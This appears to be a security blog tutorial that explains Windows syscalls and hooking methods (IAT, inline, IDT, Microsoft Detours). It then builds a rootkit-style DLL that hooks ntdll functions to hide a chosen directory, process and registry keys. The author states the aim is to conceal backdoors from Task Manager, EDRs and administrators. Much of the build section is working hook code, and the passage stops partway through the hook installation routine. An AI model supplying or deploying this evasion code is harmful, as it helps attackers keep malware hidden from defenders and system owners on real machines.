---
title: "hooking functions to hide system artifacts"
date: 2024-11-30T21:24:02-05:00
draft: false
toc: true
next: true
nomenu: false
notitle: false
---

## tl;dr

rootkit-style code that uses the Microsoft `Detours` library to perform system call hooking. this tool allows us to:

- hide malicious processes (like backdoors) from Task Manager and security tools.
- conceal files and directories from file explorers and system utilities.
- hide registry keys from registry editors and system queries.

the power comes from where it operates - at the Native API level (`ntdll.dll`), which is:

- below most security tools.
- before system calls enter kernel mode.
- the foundation that higher-level Windows APIs rely on.

what makes this particularly threatening:

- it doesn't patch kernel code or drivers (avoiding many detections).
- using `Detours` makes it relatively stable and reliable
- the hiding is comprehensive (files + processes + registry).
- it's hard to detect because it modifies data as it's being read, rather than modifying the data itself.

## system calls (syscalls)

syscalls are the fundamental interface between user-space applications and the OS kernel. they provide a programmatic way for applications to request services (and resources) from the OS, acting as a "bridge" between user- and kernel-mode. 

syscalls represent the boundary between the "underprivileged" user-mode and the "privileged" kernel-mode. when a syscall is invoked, the processor switches from user- to kernel-mode, allowing access to protected system resources.

syscalls also provide an abstraction layer that shields applications from the complexities of hardware interactions and low-level system operations. they represent the only controlled entry points into the kernel (thereby enforcing privilege boundaries), and ensure that all privileged operations *must* go through syscalls.

### privilege levels

modern processors implement a **security model** with multiple privilege levels, usually referred to as "[protection rings](https://en.wikipedia.org/wiki/Protection_ring)". x86 architecture has four privilege levels, but Ring 1 & 2 are typically unused in modern OS. Ring 3 (the least privileged) is used for user applications, whereas Ring 0 (the most privileged) is used for kernel operations. as you can guess, the kernel-mode Ring 0 has full access to system resources.

![privilege rings](/Priv_rings.png)

when a user invokes a syscall, through a wrapper function, the CPU switches from user-mode to kernel-mode. the `SYSCALL` instruction switches from Ring 3 to Ring 0, and the `SYSRET` instruction returns from Ring 0 to Ring 3. this is known as a **privilege level transition**. there are some [well-documented](https://os.pubpub.org/pub/blog-1/release/4) costs associated with these transitions, but it's out of scope here. 

### architecture

the syscall architecture is designed to provide a secure and controlled mechanism for user programs to request services from the privileged kernel mode. the **syscall interface** is the boundary between the user and kernel spaces. in x86 systems, there are four key components that make up the architecture of a syscall.

1. **syscall number**

each syscall is assigned a unique identifier, stored in the `EAX` register before the syscall is executed.

2. **SSDT: System Service Descriptor Table**

Windows uses the SSDT to map syscall numbers to their corresponding kernel-mode functions.

3. **syscall instruction**

x86 processors use the `SYSCALL` instruction to transition from user-mode to kernel-mode. 

4. **MSR: Model Specific Register**

the `MSR_LSTAR` register holds the address of the syscall handler function. this would be `entry_SYSCALL_64` on Linux.

### implementation

![syscall implementation of fork()](/syscall1.png)

when a user invokes a syscall, like `fork()`, in the Windows kernel, several things are set into motion.

first, the user program loads the syscall number into the `EAX` register. other arguments are placed in other registers (like `EBX`, `ECX`, `EDX`, etc.).

```c
int invoke_syscall(int syscall_number, int arg1, int arg2, int arg3) {
    int result;
    __asm__ __volatile__ (
        "mov %1, %%eax\n\t"  // move syscall number to eax
        "mov %2, %%ebx\n\t"  // move arg1 to ebx
        "mov %3, %%ecx\n\t"  // move arg2 to ecx
        "mov %4, %%edx\n\t"  // move arg3 to edx
        "int $0x2E\n\t"      // trigger interrupt 0x2E
        "mov %%eax, %0"      // move result from eax
        : "=r" (result)
        : "r" (syscall_number), "r" (arg1), "r" (arg2), "r" (arg3)
        : "eax", "ebx", "ecx", "edx"
    );
    return result;
}
```

in some cases, an event known as the **interrupt trigger** occurs. this is a hardware event that causes the CPU to temporarily suspend its current execution and transfer control to an interrupt handler. the program executes the `int 0x2E` instruction, and the CPU switches from Ring 3 to Ring 0. it saves the current execution context on the kernel stack.

the CPU then uses the interrupt vector `0x2E` to index into the Interrupt Descriptor Table, where it retrieves the address of the corresponding interrupt handler. the IDT setup on the kernel-side would look something like this.

```c
struct idt_entry {
    uint16_t base_low;
    uint16_t selector;
    uint8_t always0;
    uint8_t flags;
    uint16_t base_high;
} __attribute__((packed));

struct idt_entry idt[256];

void set_idt_gate(int num, uint32_t base, uint16_t sel, uint8_t flags) {
    idt[num].base_low = base & 0xFFFF;
    idt[num].base_high = (base >> 16) & 0xFFFF;
    idt[num].selector = sel;
    idt[num].always0 = 0;
    idt[num].flags = flags;
}

void idt_init() {
    set_idt_gate(0x2E, (uint32_t)syscall_entry, 0x08, 0x8E);
    // ... set up other IDT entries ...
    load_idt();
}
```

the CPU then jumps into the interrupt handler retrieved from the IDT. this handler is `KiSystemService` in Windows.

`KiSystemService` reads the syscall number from `EAX`.

the syscall entry point is pointed to by the IDT.

```c
__attribute__((naked)) void syscall_entry() {
    __asm__ __volatile__ (
        "pushl %%eax\n\t"
        "pushl %%ebx\n\t"
        "pushl %%ecx\n\t"
        "pushl %%edx\n\t"
        "call syscall_handler\n\t"
        "popl %%edx\n\t"
        "popl %%ecx\n\t"
        "popl %%ebx\n\t"
        "addl $4, %%esp\n\t"  // remove eax from stack
        "iret"
        ::: "memory"
    );
}
```

the syscall number is used to index into the SSDT (System Service Descriptor Table). the SSDT contains pointers to the actual syscall implementation functions.

```c
typedef int (*syscall_fn_t)(int, int, int);

syscall_fn_t ssdt[256];  // System Service Descriptor Table

void init_ssdt() {
    ssdt[0] = sys_read;
    ssdt[1] = sys_write;
    // ... initialize other syscall entries ...
}

int syscall_handler(int syscall_number, int arg1, int arg2, int arg3) {
    if (syscall_number >= 0 && syscall_number < 256 && ssdt[syscall_number]) {
        return ssdt[syscall_number](arg1, arg2, arg3);
    }
    return -1;  // invalid syscall
}
```

here, the kernel prepares the arguments for the syscall function, which may involve copying data from user space to kernel space. the kernel jumps to the address obtained from the SSDT, and the actual syscall function is executed.

the syscall's return value is placed into `EAX`, and any output is copied back to user space (if necessary). finally, the kernel restores the user-space context by executing `iret` to switch back to Ring 3, and the user program resumes execution after the `int 0x2E` instruction.

an important aside here is that the syscall function has to be defined and declared in the appropriate header file, typically with a `Nt` or `Zw` prefix. a user-mode function in `ntdll.dll` (aka the wrapper) has to be created, which prepares arguments and invokes the syscall.

## syscall hooking

syscall hooking is a technique used to intercept and modify the behaviour of syscalls. this can then be leveraged to monitor, alter, and redirect syscall execution. the most common and accessible hooking point is inside user-mode APIs. programs can also hook the syscall table by replacing addresses in it, or the IDT, by hooking the interrupt handler for syscalls. modifying entries in the SSDT would be much more difficult to pull off (as it's in the kernel), and [modifying entries in the MSR](https://www.infosecinstitute.com/resources/hacking/hooking-system-calls-msrs/) (model-specific register) would be the most difficult, as that would be on the hardware level.

### hooking mechanisms

#### IAT (Import Address Table) modification

the IAT contains pointers to imported functions from DLLs. it's part of the [PE file format](https://bsssq.xyz/posts/minidump-pe/) used in Windows. when a program is loaded, the Windows loader fills the IAT with the actual addresses of the imported functions. hooking the IAT means modifying the addresses to point to our hook functions instead. this is relatively easy to implement, and it works for user-mode applications. however, it only works for functions being imported by the target application and can be easily detected by integrity checks.

if you wanted to hook the `CreateFileW()` function, you would first have to find the IAT entry for `CreateFileW()` and replace the address with your hook function. in your hook function, you could log the file being opened and then call the original `CreateFileW()`.

```c
BOOL HookIAT(LPCSTR szModuleName, LPCSTR szFunctionName, PVOID pHookFunction)
{
    HMODULE hModule = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (pImportDesc->Name)
    {
        PSTR pszModuleName = (PSTR)((BYTE*)hModule + pImportDesc->Name);
        if (_stricmp(pszModuleName, szModuleName) == 0)
        {
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
            while (pThunk->u1.Function)
            {
                PROC* ppfn = (PROC*)&pThunk->u1.Function;
                BOOL bFound = (strcmp((PSTR)((PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + 
                    pThunk->u1.AddressOfData))->Name, szFunctionName) == 0);
                if (bFound)
                {
                    DWORD dwOldProtect;
                    VirtualProtect(ppfn, sizeof(PROC), PAGE_READWRITE, &dwOldProtect);
                    *ppfn = (PROC)pHookFunction;
                    VirtualProtect(ppfn, sizeof(PROC), dwOldProtect, &dwOldProtect);
                    return TRUE;
                }
                pThunk++;
            }
        }
        pImportDesc++;
    }
    return FALSE;
}
```

#### inline hooking

inline hooking (aka hot patching) is when the first few instructions of a function are modified to redirect execution to a hook function. to do this, you'd save the first few bytes of the target function, overwrite the beginning of the function with a jump (`JMP`) to your hook, and then perform your operations inside the hook before jumping back to the original function. this can hook pretty much any function, not just imported ones, and it works in both user- and kernel-mode. however, this is also more complex to implement, and you'd need to handle varying instruction lengths.

```c
#define HOOK_SIZE 5

BOOL InlineHook(PVOID pTarget, PVOID pHook)
{
    DWORD dwOldProtect;
    if (VirtualProtect(pTarget, HOOK_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
        *(BYTE*)pTarget = 0xE9; // JMP opcode
        *(DWORD*)((BYTE*)pTarget + 1) = (DWORD)((BYTE*)pHook - (BYTE*)pTarget - HOOK_SIZE);
        VirtualProtect(pTarget, HOOK_SIZE, dwOldProtect, &dwOldProtect);
        return TRUE;
    }
    return FALSE;
}
```

#### Descriptor Table Modification

this involves modifying system tables, like the IDT or SSDT. it works by locating the descriptor table in memory, then modifying entries inside it to point to a hook function. this can intercept low-level operations, and is quite powerful when it comes to system-wide monitoring. as you can guess, it requires kernel-mode access, and can be risky (as it modifies critical system structures).

```c
typedef struct _IDTENTRY {
    WORD offset_low;
    WORD selector;
    BYTE reserved;
    BYTE type_attr;
    WORD offset_high;
} IDTENTRY;

IDTENTRY* GetIDTEntry(int interrupt)
{
    IDTENTRY* idt = (IDTENTRY*)__readfsdword(0x3F0);
    return &idt[interrupt];
}

void HookIDT(int interrupt, void* newHandler)
{
    IDTENTRY* entry = GetIDTEntry(interrupt);
    DWORD handler = (DWORD)newHandler;
    entry->offset_low = handler & 0xFFFF;
    entry->offset_high = (handler >> 16) & 0xFFFF;
}
```

#### Page Table Manipulation

this involves modifying page table entries (PTEs) to change memory permissions or redirect memory accesses. we would have to locate the PTE for the target memory address, then modify the PTE to change permissions or point to a different address. this is very useful for implementing copy-on-write (CoW) or memory breakpoints.

```c
void ModifyPageTableEntry(void* virtualAddress, DWORD newAttributes)
{
    DWORD cr3;
    __asm {
        mov eax, cr3
        mov cr3, eax
    }

    // simplified PTE lookup
    DWORD* pte = (DWORD*)(((DWORD)virtualAddress >> 12) << 2);
    
    // modify PTE attributes
    *pte = (*pte & 0xFFFFF000) | (newAttributes & 0xFFF);

    // flush TLB
    __asm {
        invlpg [virtualAddress]
    }
}
```

## `Detours`

[Detours](https://github.com/microsoft/detours/wiki) is a library (developed by Microsoft) that can intercept binary functions on Windows systems. it can modify function behaviour at runtime (applying the interception code) without requiring access to the source code. it can intercept Win32 API calls (and other binary functions), and works on ARM, ARM64, x86, x64, and IA64 architectures. 

by replacing the first few instructions of a target function with a jump to a user-provided detour function, and by creating a trampoline (that contains the original instructions), the detour function can either replace or extend the target function's behaviour. for this, you'll need three things.

1. detours: this is the core mechanism for redirecting function calls.

2. trampolines: these preserve original function instructions.

3. payload: this is the custom code executed during interception.

### implementation

we'll need to include `detours.h` and link it with `detours.lib`. we'll also need to include the core "transaction" functions, `DetourAttach` and `DetourDetach`. this can then all be packaged in a DLL for insertion into existing applications.

```cpp
// core hooking transaction functions
LONG DetourTransactionBegin(VOID);
LONG DetourTransactionCommit(VOID);
LONG DetourAttach(_Inout_ PVOID *ppPointer, _In_ PVOID pDetour);
LONG DetourDetach(_Inout_ PVOID *ppPointer, _In_ PVOID pDetour);
```

1. `LONG DetourTransactionBegin(VOID);`

this initiates a new hooking transaction. it returns a status code (i.e. `NO_ERROR` upon success), and all subsequent hooking operations will be part of this transaction until committed.

2. `LONG DetourTransactionCommit(VOID);`

this commits all hooking operations in the current transaction, and it applies all the hooks atomically.

3. `LONG DetourAttach(_Inout_ PVOID *ppPointer, _In_ PVOID pDetour);`

this attaches a detour (hook) to a target function. `ppPointer` points to the address of the target function, and `pDetour` is the address of the detour function.

4. `LONG DetourDetach(_Inout_ PVOID *ppPointer, _In_ PVOID pDetour);`

this detaches a previously attached detour. the params are the same as `DetourAttach`, and it's used to remove all the hooks and restore the original function's behaviour.


### memory management

let's take a look at some of the ways `Detours` manages memory.

-  **atomically-managed transations**

this ensures that all the hooks in a transaction are applied, or rolled back, together. this helps to prevent inconsistencies where only some hooks are applied.

-  **thread synchronization**

synchronization across all the threads so that hooking is safe, meaning race conditions can be prevented during an application or removal of a hook.

- **code page permissions management**

this temporarily modifies the memory protection so that we can write to code pages. original permissions are restored after hook installation.

- **trampoline allocation**

this allocates trampolines within a 2GB range of the target function. on x64 architecture, this is necessary due to the relative addressing limitations. the allocation also makes sure that jumps between the original function, trampoline, and detour are all within reach.

### hiding

a key part of evasion is hiding system artifacts. hiding system artifacts means hiding activities from EDRs and sysadmins, and simultaneously maintaining persistence. 

to do this, we'll need to write something that operates at the `NTAPI` level. we need to hide: the file (and directory), the process, and the registry.

**hiding the file** means we need to intercept any attempt at enumerating directories. any file or directory under our path needs to become invisible to normal system queries, and applications trying to list files won't see anything in this location.

**hiding the process** will make specific processes invisible to tools. process explorers like Task Manager won't show the hidden process, but the process will be running nonetheless.

finally, **hiding the registry** means we'll be hiding registry keys/values that contain a specific pattern. this is so registry editors and EDRs can't see the entries with that pattern, and the values themselves remain in the registry but are filtered from the view. 

the importance here isn't just about hiding files or processes. it's about intercepting and modifying the ways Windows provides information about system state.

### interception

```cpp
BOOL hooky(void) {
    origNtQueryDirectoryFile = (NtQueryDirectoryFile_t)GetProcAddress(
        GetModuleHandle("ntdll.dll"), 
        "NtQueryDirectoryFile"
    );
    
    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    
    DetourAttach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
    
    LONG error = DetourTransactionCommit();
    return TRUE;
}
```

we can break down the above implementation of function interception into four parts: resolving the original function(s), atomic transactions, attaching the hooks, and committing the changes.

#### resolving original functions

```c
origNtQueryDirectoryFile = (NtQueryDirectoryFile_t)GetProcAddress(
    GetModuleHandle("ntdll.dll"), 
    "NtQueryDirectoryFile"
);
```

this obtains the address of the original `NtQueryDirectoryFile` function from `ntdll.dll`.

it then stores the address in `origNtQueryDirectoryFile` for later use in the hook function.

#### atomic transaction

```c
DetourTransactionBegin();
DetourUpdateThread(GetCurrentThread());
```

this initiates a new hooking transaction. it updates the current thread to ensure that it's aware of the impending changes.

#### attach hooks

```c
DetourAttach(&(PVOID&)origNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
```

this attaches the hook function `HookedNtQueryDirectoryFile` to the original `NtQueryDirectoryFile`.

the original function pointer is passed via reference to allow `Detours` to modify it.

#### committing changes

```c
LONG error = DetourTransactionCommit();
```

this applies all the hooks set up in this transaction. it will return an error code if the operation fails.

### trampoline generation

when `Detours` attaches a hook, it generates a trampoline. trampolines are crucial to hooking.

first, detours creates an **assembly bridge**. this is a small snippet of assembly code that serves as a bridge between the original function and the hook.

next, it **preserves the function prologue**. the prologue is the original function's first few instructions. this is necessary because these instructions are overwritten to redirect to the hook.

then, it needs to **handle any relative addressing** in the preserved instructions to work from the new location in the trampoline.

it also needs to handle cases where the original function might be set up for **hot-patching**, which is a Microsoft technique for updating functions at runtime.

in summary, a typical trampoline looks like this:

```asm
trampoline:
    ; preserved original instructions
    [first few instructions of the original function]
    
    ; jump back to the rest of the original function
    jmp [original_function + size_of_overwritten_instructions]
```

when the hook function is called, it can choose to:

- **execute its own code entirely**, bypassing the original function.

- **call the trampoline** to execute the original function's behaviour.

- **execute custom code** before and/or after calling the trampoline.

### function prologue handling

the function prologue is the initial part of a function that sets up the stack frame. `Detours` needs to handle this carefully so that the function executes properly.

```asm
; original function
push    ebp
mov     ebp, esp

; Detours trampoline
jmp     HookedFunction    ; 5-byte relative jump
; original prologue bytes saved in trampoline
```

1. **original function**

the first two instructions are a common `x86` function prologue. they set up the stack frame for the function.

2. **`Detours` modification**

this replaces the prologue with a 5-byte jump to the hook function. this jump redirects execution to the user-defined hook.

3. **trampoline**

the trampoline saves the original prologue instructions, and allows the hook function to call the original function if needed.

### memory protection management

`Detours` needs to modify code in memory, which requires changing the memory protection.here's a quick (and simplified) version of how it does this:

```cpp
BOOL DetourCopyInstruction(
    PVOID pDst,
    PVOID *ppDstPool,
    PVOID pSrc,
    PVOID *ppTarget,
    LONG *plExtra
) {
    // 1. change page protection
    DWORD dwOld;
    VirtualProtect(pDst, size, PAGE_EXECUTE_READWRITE, &dwOld);
    
    // 2. copy and fix up instruction
    // 3. restore protection
    VirtualProtect(pDst, size, dwOld, &dwOld);
}
```

it uses `VirtualProtect` to make the target memory writable before copying the instruction from source to destination. it also fixes up the instruction if necessary (like for adjusting relative addresses). finally, it returns the memory to its original protection state.

### thread synchronization

this prevents race conditions and makes sure the hook installation across all threads is consistent.

- **thread suspension**:

`Detours` suspends all threads in the process during hook installation, which. prevents threads from executing partially-modified code.

- **context management**:

`Detours` saves and manages the context (register states, instruction pointers) of all suspended threads.

- **instruction pointer adjustments**:

if a thread's instruction pointer is within the modified code region, `Detours` adjusts it to ensure correct execution after the hook is installed.

- **atomic installation**:

all hooks in a transaction are installed atomically, which ensures that at any given moment, either all hooks are active or none are.

- **thread resumption**:

after hook installation, all threads are resumed with their adjusted contexts.


## building

with all this information, we can now design our own advanced syscall hooking implementation.

### core objectives + requirements

we want to:

- **hide specific files/directories** from system enumeration.

- **conceal processes** from task managers and system tools.

- **hide registry keys** from system queries.

- **maintain system stability** while hooked.

we need to:

- **intercept low-level syscalls** (at the `NT API` level).

- modify results **without** breaking data structures.

- perform a **clean DLL injection + removal**.

- conduct **thread-safe operations**.

### `ntapi.h`

this header file define the elements necessary for interacting with the [Windows Native API](https://en.wikipedia.org/wiki/Windows_Native_API). 

first, we'll define two important status codes.

```cpp
#define STATUS_NO_MORE_FILES    0x80000006
#define STATUS_NO_MORE_ENTRIES  0x8000001A
```

these are used to indicate when an enumeration operation (such as listing files or registry keys) has reached its end. these status codes are returned by functions like `NtQueryDirectoryFile` or `NtEnumerateKey` when there's nothing left to enumerate.

next, we'll define some information classes.

```cpp
typedef enum _KEY_INFORMATION_CLASS {
    KeyBasicInformation,
    KeyNodeInformation,
    KeyFullInformation,
    KeyNameInformation,
    KeyCachedInformation,
    KeyFlagsInformation,
    KeyVirtualizationInformation,
    KeyHandleTagsInformation,
    KeyTrustInformation,
    KeyLayerInformation,
    MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;
```

these are enumerations. `KEY_INFORMATION_CLASS` specifies what type of information to retrieve about a registry key. `KEY_VALUE_INFORMATION_CLASS` specifies what type of information to retrieve about a registry value. 

these are used as parameters in functions like `NtEnumerateKey` and `NtEnumerateValueKey`.

we then need to define structures. these structures hold information about registry keys and values. 

```cpp
typedef struct _KEY_BASIC_INFORMATION {
    LARGE_INTEGER LastWriteTime;
    ULONG         TitleIndex;
    ULONG         NameLength;
    WCHAR         Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef struct _KEY_NAME_INFORMATION {
    ULONG         NameLength;
    WCHAR         Name[1];
} KEY_NAME_INFORMATION, *PKEY_NAME_INFORMATION;

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG         TitleIndex;
    ULONG         Type;
    ULONG         NameLength;
    WCHAR         Name[1];
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG         TitleIndex;
    ULONG         Type;
    ULONG         DataOffset;
    ULONG         DataLength;
    ULONG         NameLength;
    WCHAR         Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;
```

- `KEY_BASIC_INFORMATION`: contains basic information about a registry key, including its last write time and name.

- `KEY_NAME_INFORMATION`: just the name of a registry key.

- `KEY_VALUE_BASIC_INFORMATION`: basic information about a registry value, including its type and name.

- `KEY_VALUE_FULL_INFORMATION`: full information about a registry value, including its data.

finally, we'll need to define the function pointer types for NT API functions. we're going to define function pointer types that allow for dynamic loading of the functions from `ntdll.dll`. this is necessary because the functions aren't part of the standard [Win32 API](https://yuval0x92.wordpress.com/2020/03/09/native-api-win32-api/), and their addresses may change between Windows versions.

- `NtQueryDirectoryFile_t`: queries information about files in a directory.

- `NtQueryDirectoryFileEx_t`: extended version of `NtQueryDirectoryFile`, with additional flags.

- `NtQuerySystemInformation_t`: queries various types of system information. 

- `NtEnumerateKey_t`: enumerates subkeys of a registry key.

- `NtEnumerateValueKey_t`: enumerates values of a registry key.

```cpp
typedef NTSTATUS (NTAPI * NtQueryDirectoryFile_t)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
);

typedef NTSTATUS (NTAPI * NtQueryDirectoryFileEx_t)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    ULONG                  QueryFlags,
    PUNICODE_STRING        FileName
);

typedef NTSTATUS (NTAPI * NtQuerySystemInformation_t) (
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

typedef NTSTATUS (NTAPI * NtEnumerateKey_t)(
    HANDLE                KeyHandle,
    ULONG                 Index,
    KEY_INFORMATION_CLASS KeyInformationClass,
    PVOID                 KeyInformation,
    ULONG                 Length,
    PULONG                ResultLength
);

typedef NTSTATUS (NTAPI * NtEnumerateValueKey_t)(
    HANDLE                      KeyHandle,
    ULONG                       Index,
    KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    PVOID                       KeyValueInformation,
    ULONG                       Length,
    PULONG                      ResultLength
);
```

### core components

the heart of the program is responsible for installing, managing, and removing hooks on various API functions. also required are custom functions that replace the original API functions, which they have the same signature as. the DLL lifecycle will also be handled by some functions (i.e. when the DLL is loaded, unloaded, or when a new thread is created or destroyed in the process).

to start with, we'll define some macros.

```cpp
#define HIDE_PATH L"c:\\path\\"
#define HIDE_PROCNAME L"calculator.exe"
#define HIDE_REG L"$$hide"
```

these are wide-string literals (`L"..."`) so they're compatible with Unicode APIs. respectively, the macros specify a directory, a process name, and a registry key prefix to hide from enumeration.

next, we'll set up the storage for the pointers to the original API functions. they'll be init'd to `NULL` for safety, to prevent accidental calls to uninitialized function pointers. the typedefs (like `NtQueryDirectoryFile_t`) are there to ensure type safety and the correct function signatures.

```cpp
NtQueryDirectoryFile_t		origNtQueryDirectoryFile = NULL;
NtQueryDirectoryFileEx_t	origNtQueryDirectoryFileEx = NULL;
NtQuerySystemInformation_t	origNtQuerySystemInformation = NULL;
NtEnumerateKey_t			origNtEnumerateKey = NULL;
NtEnumerateValueKey_t		origNtEnumerateValueKey = NULL;
```

### hook functions

#### hiding the file

to intercept calls to `NtQueryDirectoryFile`, we'll write a function called `HookedNtQueryDirectoryFile`. 

```cpp
NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle, 
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    LPVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    LPVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status = STATUS_NO_MORE_FILES;
    WCHAR dirPath[MAX_PATH + 1] = { 0 };
    
    if (GetFinalPathNameByHandleW(FileHandle, dirPath, MAX_PATH, FILE_NAME_NORMALIZED)) {
        if (StrStrIW(dirPath, HIDE_PATH))
            ZeroMemory(FileInformation, Length);
        else
            status = origNtQueryDirectoryFile(/*params*/);
    }
    return status;
}
```

it uses `GetFinalPathNameByHandleW` to resolve the actual file path being queried. `StrStrIW` performs a case-insensitive comparison to check if the path contains `HIDE_PATH`. if the path matches, it zero-fills the `FileInformation` buffer (effectively hiding the entry). for non-hidden paths, it calls the original `NtQueryDirectoryFile` function. it returns `STATUS_NO_MORE_FILES` for hidden items, simulating an empty directory.

#### hiding the process

to intercept `NtQuerySystemInformation`, we'll write `HookedNtQuerySystemInformation`.

```cpp
NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	
	NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (SystemInformationClass == SystemProcessInformation) {

		SYSTEM_PROCESS_INFORMATION * cur = (SYSTEM_PROCESS_INFORMATION *) SystemInformation;
		SYSTEM_PROCESS_INFORMATION * prev = NULL;
		
		while (cur) {
			if (StrStrIW(cur->ImageName.Buffer, HIDE_PROCNAME)) {
				if (!prev) {
					if (cur->NextEntryOffset) SystemInformation = (LPBYTE) SystemInformation + cur->NextEntryOffset;
					else { 
						SystemInformation = NULL;
						break;
					}
				}
				else {
					if (cur->NextEntryOffset) prev->NextEntryOffset += cur->NextEntryOffset;
					else 
						prev->NextEntryOffset = 0;
				}
			}
			else prev = cur;
			
			if (cur->NextEntryOffset) cur = (SYSTEM_PROCESS_INFORMATION *) ((LPBYTE) cur + cur->NextEntryOffset);
			else break;
		}
		
	}
	
	return status;
}
```

first, it calls the original `NtQuerySystemInformation` to get actual system information.

if the `SystemInformationClass` is `SystemProcessInformation`, it proceeds to manipulate the process list:

- it iterates through the linked list of `SYSTEM_PROCESS_INFORMATION` structures.

- each structure represents a process.

- the `NextEntryOffset` field links to the next process in the list.

- for each process, it checks if the process name `ImageName.Buffer` contains `HIDE_PROCNAME` using `StrStrIW`.

- if a process matching `HIDE_PROCNAME` is found, it's removed from the list.

- if it's the first entry, the `SystemInformation` pointer is adjusted.

- it handles special cases (first, middle, last entries) by using byte-level pointer arithmetic to navigate.

- for other entries, the `NextEntryOffset` of the previous entry is modified to skip the current entry.

this continues until all entries are checked, effectively hiding specified processes from the returned information, before finally returning the status from the original function call.

#### hiding the registry

to intercept calls to `NtEnumerateKey` and `NtEnumerateValueKey`, we'll write `HookedNtEnumerateKey` and `HookedNtEnumerateValueKey`.

```cpp
NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {

	NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
	WCHAR * keyName = NULL;
	
	if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION *) KeyInformation)->Name;
	if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION *) KeyInformation)->Name;

	if (StrStrIW(keyName, HIDE_REG)) {
		ZeroMemory(KeyInformation, Length);
		status = STATUS_NO_MORE_ENTRIES;
	}
	
	return status;
};
```

`HookedNtEnumerateKey` calls the original `NtEnumerateKey` function. it extracts the key name based on the `KeyInformationClass` (supports `KeyBasicInformation` and `KeyNameInformation`).

if the key name contains `HIDE_REG`, it 0's out the `KeyInformation` buffer and sets the status to `STATUS_NO_MORE_ENTRIES`.

```cpp
NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
	
	NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
	WCHAR * keyValueName = NULL;

	if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION *) KeyValueInformation)->Name;
	if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION *) KeyValueInformation)->Name;

	if (StrStrIW(keyValueName, HIDE_REG)) {
		ZeroMemory(KeyValueInformation, Length);
		status = STATUS_NO_MORE_ENTRIES;
	}	
	
	return status;
};
```

`HookedNtEnumerateValueKey` calls the original `NtEnumerateValueKey` function. it then extracts the value name based on `KeyValueInformationClass` and 0's out the buffer if the value name contains `HIDE_REG`.

### hook installation

```cpp
BOOL hooky(void) {

    LONG err;

	origNtQueryDirectoryFile		= (NtQueryDirectoryFile_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryDirectoryFile");
	origNtQueryDirectoryFileEx		= (NtQueryDirectoryFileEx_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryDirectoryFileEx");
